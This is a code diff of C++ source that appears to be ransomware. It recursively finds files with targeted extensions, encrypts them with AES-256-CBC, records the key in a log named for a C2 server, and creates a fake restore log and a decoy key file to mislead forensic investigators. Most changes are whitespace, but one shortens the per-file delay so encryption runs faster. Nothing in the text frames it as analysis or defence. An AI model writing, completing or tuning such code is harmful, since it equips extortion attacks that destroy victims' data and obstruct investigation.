@@ -15,29 +15,29 @@ void aes_encrypt_file(const string& input_path, const string& output_path, const
     if (!infile.is_open()) {
         throw runtime_error("Cannot open input file");
     }
-   
+    
     vector<unsigned char> plaintext(
         (istreambuf_iterator<char>(infile)),
         istreambuf_iterator<char>()
     );
     infile.close();
-   
+    
     unsigned char iv[16];
     RAND_bytes(iv, sizeof(iv));
-   
+    
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
-   
+    
     vector<unsigned char> ciphertext(plaintext.size() + EVP_CIPHER_CTX_block_size(ctx));
-   
+    
     int out_len = 0, final_len = 0;
     EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len, plaintext.data(), plaintext.size());
     EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len, &final_len);
-   
+    
     int total_len = out_len + final_len;
     ciphertext.resize(total_len);
     EVP_CIPHER_CTX_free(ctx);
-   
+    
     ofstream outfile(output_path, ios::binary);
     outfile.write(reinterpret_cast<char*>(iv), sizeof(iv));
     outfile.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext.size());
@@ -46,12 +46,12 @@ void aes_encrypt_file(const string& input_path, const string& output_path, const
 
 vector<fs::path> find_target_files(const string& directory) {
     vector<fs::path> found_files;
-   
+    
     for (const auto& entry : fs::recursive_directory_iterator(directory)) {
         if (fs::is_regular_file(entry.path())) {
             string ext = entry.path().extension().string();
             for (char& c : ext) c = tolower(c);
-           
+            
             for (const auto& target : TARGET_EXTENSIONS) {
                 if (ext == target) {
                     found_files.push_back(entry.path());
@@ -71,19 +71,21 @@ void randomize_file_order(vector<fs::path>& files) {
 
 void log_to_c2(const unsigned char* key, const string& session_id, const string& process_id) {
     ofstream log("c2_server.log", ios::app);
+    
     auto now = chrono::system_clock::now();
     auto time_t_now = chrono::system_clock::to_time_t(now);
     string timestamp = ctime(&time_t_now);
     timestamp.pop_back();
-   
-    log << "[" << timestamp << "] SESSION:" << session_id
-        << " PID:" << process_id
+    
+    log << "[" << timestamp << "] SESSION:" << session_id 
+        << " PID:" << process_id 
         << " KEY:" << bytes_to_hex(key, 32) << endl;
     log.close();
 }
 
 void log_session_info(const SessionInfo& session) {
     ofstream log("session_history.log", ios::app);
+    
     log << "Session: " << session.session_id << endl;
     log << "  Time: " << session.timestamp << endl;
     log << "  PID: " << session.process_id << endl;
@@ -121,11 +123,10 @@ void forensic_wipe_memory(unsigned char* data, size_t len) {
     for (size_t i = 0; i < len; i++) p[i] = 0;
 }
 
-// In encryption.cpp, change random_delay():
 void random_delay() {
     random_device rd;
     mt19937 gen(rd());
-    uniform_int_distribution<> dis(500, 1500);  // 0.5–1.5 seconds per file
+    uniform_int_distribution<> dis(1, 100);
     this_thread::sleep_for(chrono::milliseconds(dis(gen)));
 }
 
@@ -146,13 +147,13 @@ void create_forensic_misleading_trail() {
     ofstream fake_log("system_restore.log", ios::app);
     fake_log << "[FAKE] System restore point created at: " << time(nullptr) << endl;
     fake_log.close();
-   
+    
     ofstream fake_key("temp_key_backup.key", ios::binary);
     unsigned char fake_key_data[32];
     RAND_bytes(fake_key_data, 32);
     fake_key.write(reinterpret_cast<char*>(fake_key_data), 32);
     fake_key.close();
-   
+    
     thread([](){
         this_thread::sleep_for(chrono::seconds(5));
         remove("temp_key_backup.key");
